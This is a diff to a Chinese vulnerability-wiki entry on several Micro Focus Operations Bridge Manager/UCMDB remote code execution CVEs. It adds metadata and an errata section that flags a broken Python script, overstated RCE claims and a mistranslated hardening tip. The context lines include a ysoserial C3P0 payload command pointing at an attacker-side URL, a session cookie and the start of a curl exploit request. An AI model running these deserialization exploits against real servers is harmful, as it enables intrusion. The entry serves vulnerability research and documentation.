@@ -1,8 +1,67 @@
 ---
-cve: "CVE-2020-11854"
+cve: "CVE-2020-11854;CVE-2020-11853;CVE-2020-11858"
+identifier_role: "primary"
+primary_identifiers: "CVE-2020-11854;CVE-2020-11853;CVE-2020-11858"
+referenced_identifiers: ""
+identifier_status: "unknown"
+title: "Micro Focus Operations Bridge Manager 中的多个（RCE）漏洞"
+product: "Micro Focus OBM/UCMDB及集成管理产品"
+record_type: "roundup"
+document_type: "多漏洞深度分析及攻击链"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+prerequisites: "2020.05测试及正文多产品分支；UCMDB硬编码账户可用于38服务；主Web两个servlet需另有账户；RemoteProxy仅证DNS；Windows本地目录创建"
+side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/Micro/Micro%20Focus%20Operations%20Bridge%20Manager%20%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%B8%AA%EF%BC%88RCE%EF%BC%89%E6%BC%8F%E6%B4%9E.md"
+archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
+source_status: "recorded"
+source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
+source_url: "https://mp.weixin.qq.com/s/UkY--znwJ7gqBKKEidauYQ"
+id: "vw-a3147c2c1ceb04859498381c"
+entity_id: "ve-a3147c2c1ceb04859498381c"
+schema_version: "1"
 ---
 
 # Micro Focus Operations Bridge Manager 中的多个（RCE）漏洞
+
+<!-- vulwiki-editorial-rebuild:system-misc -->
+## 条目范围与校订
+
+- 本文对象：Micro Focus OBM/UCMDB及集成管理产品
+- 文献类型：多漏洞深度分析及攻击链
+- 版本、权限及部署边界：2020.05测试及正文多产品分支；UCMDB硬编码账户可用于38服务；主Web两个servlet需另有账户；RemoteProxy仅证DNS；Windows本地目录创建
+- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现
+
+### 具体结论与待核项
+
+以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。
+
+1. 元数据只11854，至少三主CVE及两个未分配问题；41反序列化服务数量不是41CVE，不可逐接口重复建漏洞
+2. 精确保留UCMDB诊断用户不能登录主Web、Registration/SAM需另凭据与Windows本地提权限制，不能把所有链都概括未认证RCE
+3. RemoteProxy无可用gadget仅URLDNS证实反序列化，RCE是未来可能不能当已实现；旧库条目产品写Reporter10.40而论述OBM应回查适用产品
+4. Python url_login字符串在&user截断缺引号，脚本语法无效；HTTP500即命令执行成功的判据过强，需外部可验证结果
+5. 最终安全建议称安装目录不应被管理员访问，与前句只允许SYSTEM/Administrators相反，应为普通用户，危险翻译错误需优先修正
+6. 硬编码凭证译成证书、反序列化译解串联、微焦点等影响术语；38路径/ucmdb与请求/ucmdb-ui需确认部署映射
+7. 原Pedro署名在代码但缺Agile/ZDI/厂商直接公告；升级最新无具体修复版本，Metasploit将来发布属历史待更新
+8. 本地目录权限能新建不能改删这一关键区别及指定不存在JSP路径应保留；实际为Web基础设施平台非桌面
+
+### 操作风险
+
+原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响
+
+技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。
+
+### 来源追溯
+
+- 原文标注出处：<https://mp.weixin.qq.com/s/UkY--znwJ7gqBKKEidauYQ>
+- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
+- 原文参考链接（未重新核验）：<https://%s:8443/ucmdb-ui>
+- 原文参考链接（未重新核验）：<https://asciinema.org/a/376442>
+- 原文参考链接（未重新核验）：<http://fakesitethatdoesntexist.com>
+- 原文参考链接（未重新核验）：<http://TARGET/topaz/LB_Verify.jsp>
+
+### 归档技术正文
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UkY--znwJ7gqBKKEidauYQ)
@@ -499,7 +558,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-c3p0-0.9.1.2.jar C3P0 "http://10.10.10.1:
 ```
 
 ```
-COOKIE='Cookie: JSESSIONID=xQJJmHDwOQMlAL93PaLPE4PA; LWSSO_COOKIE_KEY=mqx8GAJdW7M8dh5bO99hiZjXAgOHmdteaLsy_c9N77F6n2fFB_XWpe0wDHnpG-x2RbOHNm3H7hjHsmYpRc4PPg2ohEFN7duztvJD0M_u3GUcg_YUJPy5c6ewbqi61FRllh0AoNwAb5K-1fN-uRVK0c8yEVVIkBbxn9vxsCEhofRbZNdtnDQMb3WUeb7yInwRAzfPICWMnE5iuJ_TTyTDlw..;'
+COOKIE='Cookie: JSESSIONID=xQJ******************4PA; LWSSO_COOKIE_KEY=mqx8GAJdW7M8dh5bO99hiZjXAgOHmdteaLsy_c9N77F6n2fFB_XWpe0wDHnpG-x2RbOHNm3H7hjHsmYpRc4PPg2ohEFN7duztvJD0M_u3GUcg_YUJPy5c6ewbqi61FRllh0AoNwAb5K-1fN-uRVK0c8yEVVIkBbxn9vxsCEhofRbZNdtnDQMb3WUeb7yInwRAzfPICWMnE5iuJ_TTyTDlw..;'
 
 curl -i -s -k -X $'POST' \
   -H $'Host: 10.10.10.99' \
